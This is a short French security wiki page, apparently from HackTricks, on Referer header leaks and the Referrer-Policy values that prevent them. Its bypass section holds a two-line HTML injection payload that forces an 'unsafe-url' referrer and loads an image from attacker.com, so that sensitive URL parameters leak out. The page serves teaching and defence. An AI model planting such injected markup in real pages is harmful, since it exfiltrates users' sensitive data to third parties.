{{#include ./banners/hacktricks-training.md}}

# En-têtes et politique de référent

Le référent est l'en-tête utilisé par les navigateurs pour indiquer quelle était la page précédente visitée.

## Informations sensibles divulguées

Si à un moment donné à l'intérieur d'une page web, des informations sensibles se trouvent dans les paramètres de la requête GET, si la page contient des liens vers des sources externes ou si un attaquant est capable de faire/suggérer (ingénierie sociale) à l'utilisateur de visiter une URL contrôlée par l'attaquant. Il pourrait être en mesure d'exfiltrer les informations sensibles à l'intérieur de la dernière requête GET.

## Atténuation

Vous pouvez faire en sorte que le navigateur suive une **politique de référent** qui pourrait **éviter** que les informations sensibles soient envoyées à d'autres applications web :
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Contre-mesures

Vous pouvez contourner cette règle en utilisant une balise meta HTML (l'attaquant doit exploiter une injection HTML) :
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Défense

Ne mettez jamais de données sensibles dans les paramètres GET ou les chemins dans l'URL.

{{#include ./banners/hacktricks-training.md}}
